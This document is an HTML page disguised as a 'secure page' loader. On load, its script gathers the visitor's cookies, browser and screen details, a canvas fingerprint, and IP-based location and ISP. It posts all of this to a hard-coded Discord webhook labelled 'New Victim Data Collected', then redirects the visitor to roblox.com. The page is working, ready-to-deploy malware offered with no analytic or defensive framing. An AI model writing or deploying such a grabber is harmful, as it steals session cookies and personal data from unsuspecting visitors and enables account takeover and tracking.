<!DOCTYPE html>
<html>
<head>
    <title>Loading secure page...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body>
    <script>
        function getFingerprint() {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = "top";
            ctx.font = "14px Arial";
            ctx.fillText("Canvas Fingerprint Test", 2, 2);
            return canvas.toDataURL();
        }

        function sendData() {
            const data = {
                timestamp: new Date().toISOString(),
                url: window.location.href,
                referrer: document.referrer,
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                cookies: document.cookie,
                screen: {
                    width: screen.width,
                    height: screen.height,
                    colorDepth: screen.colorDepth
                },
                fingerprint: getFingerprint()
            };

            fetch('https://ipapi.co/json/')
                .then(r => r.json())
                .then(ipData => {
                    data.ip = ipData.ip;
                    data.city = ipData.city;
                    data.region = ipData.region;
                    data.country = ipData.country;
                    data.isp = ipData.org;
                    sendToServer(data);
                })
                .catch(() => sendToServer(data));
        }

        function sendToServer(data) {
            fetch('https://discord.com/api/webhooks/1515731170091073640/pD3_kTsADTiRMWQz1El3hmkADG4r1Gq1mizvvkK7uXw8-g9CJO-xr53XTuQoMRfBn', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    content: '**New Victim Data Collected**',
                    embeds: [{
                        description: '```json\n' + JSON.stringify(data, null, 2) + '\n```'
                    }]
                })
            });
        }

        window.onload = () => {
            sendData();
            setTimeout(() => { 
                window.location.href = "https://www.roblox.com"; 
            }, 1200);
        };
    </script>
</body>
</html>
